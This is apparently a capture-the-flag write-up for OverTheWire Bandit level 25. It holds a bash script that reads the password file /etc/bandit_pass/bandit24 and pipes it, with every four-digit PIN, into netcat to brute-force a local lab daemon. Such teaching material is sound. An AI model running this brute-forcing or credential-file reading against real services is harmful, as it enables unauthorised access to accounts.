__ Bandit Level 25 __
---

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

Okay, so writing a bash script that inputs `cat /etc/bandit_pass/bandit24` + 0000 - 9999 into netcat.

We can use sequence for this.

```bash
#!/bin/bash
passb24=$(cat /etc/bandit_pass/bandit24)
for i in $(seq -w 9999); # can also use for i in {000..9999}
do
    echo $passb24 $i
done
```
Output this script into a file:
`./bf > /tmp/bflines`
Fire this file into netcat
`cat /tmp/bflines | nc localhost 30002`